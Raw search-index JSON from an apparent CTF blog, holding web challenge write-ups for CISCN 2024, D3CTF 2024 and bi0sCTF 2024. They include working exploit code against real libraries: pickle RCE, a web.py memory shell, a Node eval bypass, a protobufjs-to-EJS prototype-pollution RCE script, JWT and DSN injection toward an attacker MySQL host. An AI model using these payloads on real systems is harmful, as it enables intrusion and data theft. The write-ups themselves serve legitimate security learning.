org.noear.solon.core.AppContext#methodGet会对method进行包装：\npublic MethodWrap methodGet(Method method) { MethodWrap mw = methodCached.get(method); if (mw == null) { SYNC_LOCK.lock(); try { mw = methodCached.get(method); if (mw == null) { mw = new MethodWrap(this, method); methodCached.put(method, mw); } } finally { SYNC_LOCK.unlock(); } } return mw; } @org.noear.solon.Solon.app().context()可以获取上下文，也就是Appcontext对象。\n要包装函数需要先获得Method对象。 org.noear.solon.core.util.ReflectUtil#getDeclaredMethods可以获得所有声明方法。\npublic static Method[] getDeclaredMethods(Class\u0026lt;?\u0026gt; clazz) { return global.getDeclaredMethods(clazz); } 这样就可以调用任意类的任意public函数了。\n回显 org.noear.solon.core.handle.ContextUtil#current可获取当前线程的上下文，这里的context和appcontext不一样，此处的context只包含本次请求的请求包和返回包等内容。\npublic static Context current(){ Context tmp = threadLocal.get(); if (tmp == null \u0026amp;\u0026amp; Solon.cfg().testing()) { tmp = new ContextEmpty(); threadLocal.set(tmp); } return tmp; } solon使用的是smarthttp。smhttpctx对象有一个output函数用来向返回包写数据。 org.noear.solon.boot.smarthttp.http.SmHttpContext#output\npublic void output(byte[] bytes) { try { OutputStream out = this.outputStream(); if (this._allows_write) { out.write(bytes); } } catch (Throwable var3) { throw new RuntimeException(var3); } } 将数据写入byte[]中再代用output就可以回显了。 getInputStream()获得执行结果的inputstream对象，byte[]对象通过反射Array获得。\n结尾 目前beetl的3.17.0版本已经默认使用白名单模式 链接\n","permalink":"https://zoiltin.github.io/posts/ciscn2024-final-fobee-wp/","summary":"本篇文章仅用于技术交流学习和研究的目的，严禁使用文章中的技术用于非法目的和破坏。\n前言 拿到了前段时间ciscn 2024 final的web题附件，来复现一下Fobee这道题，顺便学习一下beetl的模板注入。\n3.15.x及以前的版本 过滤的很少，随便绕过。贴几个公开的poc： https://gitee.com/xiandafu/beetl/issues/I6RUIP https://gitee.com/xiandafu/beetl/issues/I914H3\n3.16.0 3.16.0是题目使用的版本也是本文使用的版本。\n测试环境为java8u65， beetl 3.16.0， solon 2.8.5\n入口 @Mapping(\u0026#34;/render\u0026#34;) public ModelAndView render(String pass, String tp) throws Exception { ModelAndView model = new ModelAndView(\u0026#34;render.htm\u0026#34;); if (pass != null \u0026amp;\u0026amp; pass.equals(password)) { byte[] decode = Base64.getDecoder().decode(tp); String result = BeetlKit.render(new String(decode), new HashMap()); System.out.println(result); model.put(\u0026#34;msg\u0026#34;, getMD5Hash(result)); } else { model.put(\u0026#34;msg\u0026#34;, \u0026#34;Render Page\u0026#34;); } return model; } 渲染过程 由renderTo进入execute函数。然后遍历所有要执行的语句然后依次执行。 每条语句的具体执行代码在org.beetl.core.statement.NativeCallExpression#evaluate函数。\npublic Object evaluate(Context ctx) { Class targetCls = null; Object targetObj = null; NativeNode lastNode = null; if (insNode !","title":"Ciscn 2024 final Fobee wp"},{"content":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==\n","permalink":"https://zoiltin.github.io/about/","summary":"Cyber Security enthusiasts / CTFer\nemail: em9pbHRpbjB4QGdtYWlsLmNvbQ==","title":"About"},{"content":"d3pythonhttp 解决，一血\njwt绕过 def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：\nPOST /admin HTTP/1.1 Host: 192.168.72.137:8081 Content-Length: 192 Cookie: token=eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M Transfer-Encoding: chunKed dc \u0026lt;base64payload...长度为192\u0026gt;BackdoorPasswordOnlyForAdmin 0 后端只读取前192个字符，后面的BackdoorPasswordOnlyForAdmin被舍弃。绕过。 base64解码后pickle反序列化。\nimport pickle import os import base64 payload = \u0026#34;\u0026#34;\u0026#34; print(1) \u0026#34;\u0026#34;\u0026#34; class test: def __reduce__(self): return (exec,(payload,)) a = test() b = base64.b64encode(pickle.dumps(a)) print(b) 突破内网 题目不出网，可以试试整个类似内存马的东西（从dubhe ctf 2024中学到的）。 后端存在以下路由：\nurls = ( \u0026#39;/\u0026#39;, \u0026#39;index\u0026#39;, \u0026#39;/backdoor\u0026#39;, \u0026#39;backdoor\u0026#39; ) web.config.debug = False app = web.application(urls, globals()) class index: def GET(self): return \u0026#34;welcome to the backend!\u0026#34; 对应前端代码：\n@app.route(\u0026#39;/backend\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def proxy_to_backend(): forward_url = \u0026#34;python-backend:8080\u0026#34; conn = http.client.HTTPConnection(forward_url) method = request.method headers = {key: value for (key, value) in request.headers if key != \u0026#34;Host\u0026#34;} data = request.data path = \u0026#34;/\u0026#34; if request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() conn.request(method, path, body=data, headers=headers) response = conn.getresponse() return response.read() response = conn.getresponse() 这段代码意味着后端处理的数据后会回显到前端，而/backdoor路由不会，所以我们可以将后端index路由覆盖为内存马。 使用exec函数执行以下python代码就可以将index路由的GET方法覆盖(asd参数要保留，因为服务器调用的时候会传一个self参数)：\ndef test(asd): return \u0026#34;pwned\u0026#34; index.GET = test 访问index路由是可以带get参数：\nif request.query_string: path += \u0026#34;?\u0026#34; + request.query_string.decode() 所以内存马实现如下：\ndef test(asd): cmd = web.input().cmd return __import__(\u0026#39;os\u0026#39;).popen(cmd).read() index.GET = test stack_overflow 解决，一血\n题目用nodejs模拟了一个栈溢出。 关键代码：\nlet respond = {} let stack = [] let getStack = function (address) { if (address - pie \u0026gt;= 0 \u0026amp;\u0026amp; address - pie \u0026lt; 0x10000) return stack[address - pie] return 0 } let getIndex = function (address) { return address - pie } let read = function (fd, buf, count) { let ori = req.body[fd] if (ori.length \u0026lt; count) { count = ori.length } if (typeof ori !== \u0026#34;string\u0026#34; \u0026amp;\u0026amp; !Array.isArray(ori)) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) for (let i = 0; i \u0026lt; count; i++){ if (waf(ori[i])) return res.json({\u0026#34;err\u0026#34;: \u0026#34;hack!\u0026#34;}) stack[getIndex(buf) + i] = ori[i] } } let write = function (fd, buf, count) { if (!respond.hasOwnProperty(fd)) { respond[fd] = [] } for (let i = 0; i \u0026lt; count; i++){ respond[fd].push(getStack(buf + i)) } } let run = function (address) { let continuing = 1; while (continuing) { switch (getStack(address)) { case \u0026#34;read\u0026#34;: let r_fd = stack.pop() let read_addr = stack.pop() if (read_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; read_addr.endsWith(\u0026#34;}}\u0026#34;)) { read_addr = pie + eval(read_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } read(r_fd, parseInt(read_addr), parseInt(stack.pop())) break; case \u0026#34;write\u0026#34;: let w_fd = stack.pop() let write_addr = stack.pop() if (write_addr.startsWith(\u0026#34;{{\u0026#34;) \u0026amp;\u0026amp; write_addr.endsWith(\u0026#34;}}\u0026#34;)) { write_addr = pie + eval(write_addr.slice(2,-2).replace(\u0026#34;stack\u0026#34;, (stack.length - 1).toString())) } write(w_fd, parseInt(write_addr), parseInt(stack.pop())) break; case \u0026#34;exit\u0026#34;: continuing = 0; break; case \u0026#34;call_interface\u0026#34;: let numOfArgs = stack.pop() let cmd = stack.pop() let args = [] for (let i = 0; i \u0026lt; numOfArgs; i++) { args.push(stack.pop()) } cmd += \u0026#34;(\u0026#39;\u0026#34; + args.join(\u0026#34;\u0026#39;,\u0026#39;\u0026#34;) + \u0026#34;\u0026#39;)\u0026#34; let result = vm.runInNewContext(cmd) stack.push(result.toString()) break; case \u0026#34;push\u0026#34;: let numOfElem = stack.pop() let elemAddr = parseInt(stack.pop()) for (let i = 0; i \u0026lt; numOfElem; i++) { stack.push(getStack(elemAddr + i)) } break; default: stack.push(getStack(address)) break; } address += 1 } } let code = `0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 28 [[ 0 ]] stdin read Started Convertion... Your input is: 2 [[short - 3]] stdout write 5 [[ 0 ]] stdout write ... 1 [[short - 2]] stdout write [[ 0 ]] 5 push (function (...a){ return a.map(char=\u0026gt;char.charCodeAt(0)).join(\u0026#39; \u0026#39;);}) 5 call_interface Ascii is: 1 [[short - 2]] result write 1 {{ stack - 2 }} result write Ascii is: 1 [[short - 2]] stdout write 1 {{ stack - 3 }} stdout write ok 1 [[short - 2]] status write exit` code = code.split(\u0026#39;\\n\u0026#39;); for (let i = 0; i \u0026lt; code.length; i++){ stack.push(code[i]) if (stack[i].startsWith(\u0026#34;[[\u0026#34;) \u0026amp;\u0026amp; stack[i].endsWith(\u0026#34;]]\u0026#34;)) { stack[i] = (pie + eval(stack[i].slice(2,-2).replace(\u0026#34;short\u0026#34;, i.toString()))).toString() } } run(pie + 0) return res.json(respond) 首先第一步操作read，从stdin读取，地址为[[ 0 ]] =\u0026gt; pie，最大读取长度为28。但是code初始只给了20个0空位，也就是说如果读入28个，正好会把第二个操作write的读取地址覆盖，也就是可以控制write函数的读取地址。 waf过滤不全：\nfunction waf(str) { let pattern = /(call_interface)|\\{\\{.*?\\}\\}/g; return str.match(pattern) } 仔细看write函数，如果地址以{{开头，}}结尾，会将中间的数据传给eval函数而正则表达式.*不能匹配换行，所以可以直接使用{{\\nrequire('child_process').exec('id')}}执行命令。read函数可以是字符串也可以是数组，所以可以传此地址。第28位为要执行的命令，27位为传入的数据的长度，写28。\n{\u0026#34;stdin\u0026#34;:[\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;a\u0026#34;,\u0026#34;28\u0026#34;,\u0026#34;{{\\nrequire(\u0026#39;child_process\u0026#39;).exec(\u0026#39;ls / \u0026gt; /app/index.html\u0026#39;)}}\u0026#34;]} 题目环境有个奇怪的地方，本地环境需要/readflag，直接读flag读不出来，但远程环境/readflag读不出来，直接读flag却可以了，dockerfile里的root用户密码也没用上，感觉怪怪的。\nmoonbox 解决\n题目给了个moonbox的后台，flag在moonbox-server容器内。 官方的流程图（录制模式） moonbox有自定义agent的功能，官方文档：\n已修改moonbox-agent 如修改过moonbox-agent代码，那么需要把修改过的agent代码重新打包。打包步骤如下 step1：maven打包(可选) 执行 mvn clean install操作 step2：打包moonbox-agent 执行打包命令，命令路径为 /moonbox-agent/moonbox-java-agent/bin sh ./install-local-agent.sh step3：agent包上传 moonbox-agent “文件更新”上传包，可以选择step2打包生成的 agengt文件即可。\n根据流程，我们可以修改agent能够在JVM所在机器中执行任意shell脚本。 不过呢，使用mvn打包的话容易报错，直接在.sandbox-module/bin/start-remote-agent.sh中写入反弹shell的命令。然后打包上传即可（moonbox-agent）。 目录结构：\n.sandbox-module/ bin/ install-local-agent.sh start-remote-agent.sh 正常版本在local-agent目录下，可以参考着改。\n有个坑，nginx不允许传大文件，可以把除shell脚本以外的文件删除，不影响执行。 连接JVM机器需要ssh连接，而容器ssh为弱口令root:123456，配置好录制流量即可执行shell脚本。\nDoctor 未解决\n默认密码和jwt key都改了。\nwebsocket可以绕过部分jwt限制。 对于recoder的验证，如果是websocket直接通过。\nfunc SuperRecorderGroup() yee.HandlerFunc { return func(c yee.Context) (err error) { if c.IsWebsocket() { return nil } role := new(lib.Token).JwtParse(c) if role.IsRecord { return } return c.ServerError(http.StatusForbidden, \u0026#34;非法越权操作！\u0026#34;) } } 对于jwt也是\nreturn func(c yee.Context) (err error) { // cause upgrade websocket will clear custom header // when header add jwt bearer that panic if c.IsWebsocket() { return } 但是没有SuperManageGroup权限。只能获得普通用户权限。\n然后就卡住了~~\n赛后复现 越权之后可以访问GET /api/v2/fetch/fields\nfunc FetchTableInfo(c yee.Context) (err error) { u := new(_FetchBind) if err = c.Bind(u); err != nil { c.Logger().Error(err.Error()) return c.JSON(http.StatusOK, common.ERR_REQ_BIND) } if u.DataBase != \u0026#34;\u0026#34; \u0026amp;\u0026amp; u.Table != \u0026#34;\u0026#34; { if err := u.FetchTableFieldsOrIndexes(); err != nil { c.Logger().Critical(err.Error()) } return c.JSON(http.StatusOK, common.SuccessPayload(map[string]interface{}{\u0026#34;rows\u0026#34;: u.Rows, \u0026#34;idx\u0026#34;: u.Idx})) } return c.JSON(http.StatusOK, common.ERR_COMMON_MESSAGE(errors.New(i18n.DefaultLang.Load(i18n.INFO_LIBRARY_NAME_TABLE_NAME)))) } 调用FetchTableFieldsOrIndexes函数：\nfunc (u *_FetchBind) FetchTableFieldsOrIndexes() error { var s model.CoreDataSource model.DB().Where(\u0026#34;source_id =?\u0026#34;, u.SourceId).First(\u0026amp;s) ps := lib.Decrypt(model.JWT, s.Password) db, err := model.NewDBSub(model.DSN{ Username: s.Username, Password: ps, Host: s.IP, Port: s.Port, DBName: u.DataBase, CA: s.CAFile, Cert: s.Cert, Key: s.KeyFile, }) if err != nil { return err } defer model.Close(db) if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW FULL FIELDS FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Rows).Error; err != nil { return err } if err := db.Raw(fmt.Sprintf(\u0026#34;SHOW INDEX FROM `%s`.`%s`\u0026#34;, u.DataBase, u.Table)).Scan(\u0026amp;u.Idx).Error; err != nil { return err } return nil } 此时数据库中没有DataSource数据，所以s为空，所以后面的DSN中只有DBName可控。 model.NewDBSub：\nfunc NewDBSub(dsn DSN) (*gorm.DB, error) { d, err := InitDSN(dsn) if err != nil { return nil, err } db, err := gorm.Open(drive.New(drive.Config{ DSN: d, DefaultStringSize: 256, // string 类型字段的默认长度 SkipInitializeWithVersion: false, // 根据当前 MySQL 版本自动配置 }), \u0026amp;gorm.Config{}) if err != nil { return nil, err } return db, nil } InitDSN会将dsn序列化。 InitDSN：\nfunc InitDSN(dsn DSN) (string, error) { isTLS := false if dsn.CA != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Cert != \u0026#34;\u0026#34; \u0026amp;\u0026amp; dsn.Key != \u0026#34;\u0026#34; { isTLS = true certPool := x509.NewCertPool() if ok := certPool.AppendCertsFromPEM([]byte(dsn.CA)); !ok { return \u0026#34;\u0026#34;, fmt.Errorf(\u0026#34;failed to append ca certs\u0026#34;) } clientCert := make([]tls.Certificate, 0, 1) certs, err := tls.X509KeyPair([]byte(dsn.Cert), []byte(dsn.Key)) if err != nil { return \u0026#34;\u0026#34;, err } clientCert = append(clientCert, certs) _ = mmsql.RegisterTLSConfig(\u0026#34;custom\u0026#34;, \u0026amp;tls.Config{ RootCAs: certPool, Certificates: clientCert, InsecureSkipVerify: true, }) } cfg := mmsql.Config{ User: dsn.Username, Passwd: dsn.Password, Addr: fmt.Sprintf(\u0026#34;%s:%d\u0026#34;, dsn.Host, dsn.Port), //IP:PORT Net: \u0026#34;tcp\u0026#34;, DBName: dsn.DBName, Loc: time.Local, AllowNativePasswords: true, ParseTime: true, } if isTLS == true { cfg.TLSConfig = \u0026#34;custom\u0026#34; } return cfg.FormatDSN(), nil } cfg中依然只有DBName可控。 cfg.FormatDSN()：\nfunc (cfg *Config) FormatDSN() string { var buf bytes.Buffer // [username[:password]@] if len(cfg.User) \u0026gt; 0 { buf.WriteString(cfg.User) if len(cfg.Passwd) \u0026gt; 0 { buf.WriteByte(\u0026#39;:\u0026#39;) buf.WriteString(cfg.Passwd) } buf.WriteByte(\u0026#39;@\u0026#39;) } // [protocol[(address)]] if len(cfg.Net) \u0026gt; 0 { buf.WriteString(cfg.Net) if len(cfg.Addr) \u0026gt; 0 { buf.WriteByte(\u0026#39;(\u0026#39;) buf.WriteString(cfg.Addr) buf.WriteByte(\u0026#39;)\u0026#39;) } } // /dbname buf.WriteByte(\u0026#39;/\u0026#39;) buf.WriteString(cfg.DBName) // [?param1=value1\u0026amp;...\u0026amp;paramN=valueN] hasParam := false if cfg.AllowAllFiles { hasParam = true buf.WriteString(\u0026#34;?allowAllFiles=true\u0026#34;) } 生成DSN：user:pass@tcp(address:port)/dbname?param=asd，其中dbname可控。 解析DSN时从后往前找斜杠：\nfunc ParseDSN(dsn string) (cfg *Config, err error) { // New config with some default values cfg = NewConfig() // [user[:password]@][net[(addr)]]/dbname[?param1=value1\u0026amp;paramN=valueN] // Find the last \u0026#39;/\u0026#39; (since the password or the net addr might contain a \u0026#39;/\u0026#39;) 所以设置dbname为user:pass@tcp(evil_ip:port)/test?allowAllFiles=true\u0026amp;可以使服务器连接恶意mysql服务器，前面的原始的address就被忽略了，开启allowAllFiles可以读取文件。\n","permalink":"https://zoiltin.github.io/posts/d3ctf-2024-web-wp/","summary":"d3pythonhttp 解决，一血\njwt绕过 def get_key(kid): key = \u0026#34;\u0026#34; dir = \u0026#34;/app/\u0026#34; try: with open(dir+kid, \u0026#34;r\u0026#34;) as f: key = f.read() except: pass print(key) return key def verify_token(token): header = jwt.get_unverified_header(token) kid = header[\u0026#34;kid\u0026#34;] key = get_key(kid) try: payload = jwt.decode(token, key, algorithms=[\u0026#34;HS256\u0026#34;]) return True except: return False 验证jwt时kid控制密钥文件路径，如果设置的密钥文件不存在，则key为空，所以构造空秘钥以及一个不存在的文件即可：\nprint(jwt.encode({\u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;,\u0026#34;isadmin\u0026#34;:true}, key, algorithm=\u0026#34;HS256\u0026#34;, headers={\u0026#34;kid\u0026#34;: \u0026#34;frontend_keyasdasd\u0026#34;})) # eyJhbGciOiJIUzI1NiIsImtpZCI6ImZyb250ZW5kX2tleWFzZGFzZCIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaXNhZG1pbiI6dHJ1ZX0.LmTEt2GD0-nVv-yvf7Dc0lNAlQqBj9FYBb932_UWO6M 解析差异 一种做法是TE-CL请求走私。不过我用的是另一种办法：前端使用Flask，后端使用web.py存在解析差异。 经测试发现：前段对于chunked不分大小写，后端会区分。前端只进行分块传输，忽略Content-Length。而后端会先分块，再根据Content-Length截取，前端会把Content-Length直接发送给后端。\nheaders = {key: value for (key, value) in request.headers if key != \u0026#39;Host\u0026#39;} 除了Host以外的header都发往后端了包括Content-Length，且前端不进行计算验证。 数据包：","title":"d3ctf-2024-web-wp"},{"content":"required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /create会进行protojs解析。\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = protobuf.parse(schema).root; Note = root.lookupType(\u0026#39;Note\u0026#39;); [...] 在/customise可以修改settings.proto文件。\napp.post(\u0026#39;/customise\u0026#39;,(req, res) =\u0026gt; { try { const { data } = req.body; let author = data.pop()[\u0026#39;author\u0026#39;]; let title = data.pop()[\u0026#39;title\u0026#39;]; let protoContents = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;).split(\u0026#39;\\n\u0026#39;); if (author) { protoContents[5] = ` ${author} string author = 3 [default=\u0026#34;user\u0026#34;];`; } if (title) { protoContents[3] = ` ${title} string title = 1 [default=\u0026#34;user\u0026#34;];`; } fs.writeFileSync(\u0026#39;./settings.proto\u0026#39;, protoContents.join(\u0026#39;\\n\u0026#39;), \u0026#39;utf-8\u0026#39;); return res.json({ Message: \u0026#39;Settings changed\u0026#39; }); } catch (error) { console.error(error); res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } }) 解题思路（非预期）是通过原型链污染到ejs render渲染rce。ejs利用链参考：https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce\nPOC：\nimport requests base_url = \u0026#39;http://192.168.72.137:3000\u0026#39; payloads = [ \u0026#39;option(a).constructor.prototype.client = 1;\u0026#39;.strip(), \u0026#39;option(a).constructor.prototype.escapeFunction = \u0026#34;JSON.stringify; process.mainModule.require(\\\u0026#39;child_process\\\u0026#39;).exec(\\\u0026#39;touch /tmp/poc\\\u0026#39;)\u0026#34;;\u0026#39;.strip() ] for i in payloads: # 写入settings.proto sp = requests.post(url=base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : i + \u0026#34;optional\u0026#34;} ] }) # 污染 sp = requests.post(url=base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;test\u0026#34; : \u0026#34;test\u0026#34;}) sp = requests.get(url=base_url+\u0026#39;/customise\u0026#39;) # 执行render渲染达成rce 这个解法根本用不到bot\n踩坑 在原型链污染的时候会报如下错误： 有一种无法污染的假象，其实通过debug可以发现，虽然报错了但污染也成功了。\n对Dockerfile做下修改 npm install挂代理，修改部分目录权限(方便vscode ssh链接，尤其是不是root用户的情况下)，最主要的是注释掉node index.js：\nFROM node:20.2.0-alpine RUN apk update \u0026amp;\u0026amp; apk upgrade RUN apk add chromium WORKDIR /app COPY . /app/ RUN mkdir -p /app/notes RUN npm config set proxy=socks5://192.168.136.1:7890 \u0026amp;\u0026amp; PUPPETEER_SKIP_CHROMIUM_DOWNLOAD=1 npm install \u0026amp;\u0026amp; npm config delete proxy RUN chmod +x /app/index.js RUN rm *.json RUN adduser -D -u 1001 bot \u0026amp;\u0026amp; chown -R bot:bot /app/notes \u0026amp;\u0026amp; chown bot:bot /app/settings.proto \u0026amp;\u0026amp; chmod 777 -R /app \u0026amp;\u0026amp; chmod 777 -R /home/bot USER bot ENV PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser #ENTRYPOINT [\u0026#34;node\u0026#34;, \u0026#34;index.js\u0026#34;] docker run -it -p 3000:3000 \u0026lt;image-id\u0026gt; 然后使用vscode连接容器ssh。参考：https://www.cnblogs.com/booturbo/p/16323439.html 启动debug 在执行render时打断点，发现已经污染成功。 其他的RCE利用方式 第一种 作者原文：https://hackmd.io/@r2dev2/Hkj7IhP3T hacktrick上有许多污染child_process相关变量进行rce的方法：https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce\n通过spawn函数和cmdline的poc：\n// cmdline trick - working with small variation (shell) // NOT working after kEmptyObject (fix) without options const { spawn } = require(\u0026#39;child_process\u0026#39;); p = {} p.__proto__.shell = \u0026#34;/proc/self/exe\u0026#34; //You need to make sure the node executable is executed p.__proto__.argv0 = \u0026#34;console.log(require(\u0026#39;child_process\u0026#39;).execSync(\u0026#39;touch /tmp/spawn-cmdline\u0026#39;).toString())//\u0026#34; p.__proto__.NODE_OPTIONS = \u0026#34;--require /proc/self/cmdline\u0026#34; var proc = spawn(\u0026#39;something\u0026#39;); //var proc = spawn(\u0026#39;something\u0026#39;,[],{\u0026#34;cwd\u0026#34;:\u0026#34;/tmp\u0026#34;}); //To work after kEmptyObject (fix) 而且bot通过puppeteer启动chrome浏览器时会调用spawn函数。从而实现rce。 这种方法在revenge上不能用。\n第二种 作者原文：https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2 这里的POC revenge和non-revenge均可。\n泄露flagid的解法 作者原文：https://siunam321.github.io/ctf/bi0sCTF-2024/Web-Exploitation/required-notes/ /search搜索note时使用了glob，glob协议可以使用通配符，有利用的可能。\napp.get(\u0026#39;/search/:noteId\u0026#39;, (req, res) =\u0026gt; { const noteId = req.params.noteId; const notes=glob.sync(`./notes/${noteId}*`); if(notes.length === 0){ return res.json({Message: \u0026#34;Not found\u0026#34;}); } else{ try{ fs.accessSync(`./notes/${noteId}.json`); return res.json({Message: \u0026#34;Note found\u0026#34;}); } catch(err){ return res.status(500).json({ Message: \u0026#39;Internal server error\u0026#39; }); } } }) 通过noteId可以一位一位地获取flagid，但是app.use('/search', restrictToLocalhost);限制了/search的访问IP。\nconst restrictToLocalhost = (req, res, next) =\u0026gt; { const remoteAddress = req.connection.remoteAddress; if (remoteAddress === \u0026#39;::1\u0026#39; || remoteAddress === \u0026#39;127.0.0.1\u0026#39; || remoteAddress === \u0026#39;::ffff:127.0.0.1\u0026#39;) { next(); } else { res.status(403).json({ Message: \u0026#39;Access denied\u0026#39; }); } }; 所以我们只要将remoteAddress污染为127.0.0.1就可以了。\n踩坑 地址修改不成功 原因是获取req.connection中的remoteAddress不是直接获取的。 所以我们需要修改address。还有一个问题是在调用remoteAddress之前_peername不会实例化，导致污染无效。 req.connection._getpeername()代码如下：\nfunction() { if (!this._handle || !this._handle.getpeername || this.connecting) { return this._peername || {}; } else if (!this._peername) { const out = {}; const err = this._handle.getpeername(out); if (err) return out; this._peername = out; } return this._peername; } 正常情况下会进入else if因为发起请求时_peername尚未实例化，然后通过getpeername(out)给_peername赋值，污染就无效了。 但如果一开始污染_peername，使_peername一开始就有值，就不会进入else if，直接return被污染的_peername。 POC:\nimport requests base_url = \u0026#39;http://192.168.72.137:3000\u0026#39; flagid = \u0026#39;\u0026#39; characters = \u0026#39;abcdefghijklmnopqrstuvwxyz0123456789\u0026#39; pollu = \u0026#39;option(a).constructor.prototype._peername.address = \u0026#34;127.0.0.1\u0026#34;;\u0026#39;.strip() sp = requests.post(base_url+\u0026#39;/customise\u0026#39;,json={ \u0026#34;data\u0026#34; : [ {\u0026#34;title\u0026#34; : \u0026#34;optional\u0026#34;}, {\u0026#34;author\u0026#34; : pollu + \u0026#34;optional\u0026#34;} ] }) sp = requests.post(base_url+\u0026#39;/create\u0026#39;,json={\u0026#34;asd\u0026#34; : \u0026#34;asd\u0026#34;}) for i in range(16): for l in characters: noteid = flagid + l print(noteid,end=\u0026#39;\\r\u0026#39;) sp = requests.get(base_url+\u0026#39;/search/\u0026#39;+noteid) if \u0026#39;Not found\u0026#39; in sp.text: continue elif \u0026#39;Internal server error\u0026#39; in sp.text: flagid = flagid + l break elif \u0026#39;Note found\u0026#39; in sp.text: flagid = flagid + l print(\u0026#34;flagid : \u0026#34;+flagid) exit() flagid = flagid + \u0026#39;_\u0026#39; print(\u0026#34;flagid : \u0026#34;+flagid) 预期解 预期是通过原型链污染让bot访问时注入恶意html标签去泄露flagid。POC:https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 之前提到/search使用了glob，预期解是通过原型链污染造成html注入使bot访问/search枚举flagid的每一位。bot禁用了js，所以只能注入html标签打xsleak了。\nvarietynote 参考 https://www.code-intelligence.com/blog/cve-protobufjs-prototype-pollution-cve-2023-36665 https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce https://book.hacktricks.xyz/pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce https://hackmd.io/@r2dev2/Hkj7IhP3T https://gist.github.com/Ze-Pacifist/9bcd1072a62bbc5850322878b21bc8c8 https://gist.github.com/arkark/4a70a2df20da9732979a80a83ea211e2\n","permalink":"https://zoiltin.github.io/posts/bi0s-ctf-2024-wp/","summary":"required note 用npm audit搜索历史漏洞。发现一个原型链污染的漏洞。 POC:\nconst protobuf = require(\u0026#34;protobufjs\u0026#34;); protobuf.parse(\u0026#39;option(a).constructor.prototype.verified = true;\u0026#39;); console.log({}.verified); // returns true /create会进行protojs解析。\napp.post(\u0026#39;/create\u0026#39;, (req, res) =\u0026gt; { requestBody=req.body try{ schema = fs.readFileSync(\u0026#39;./settings.proto\u0026#39;, \u0026#39;utf-8\u0026#39;); root = 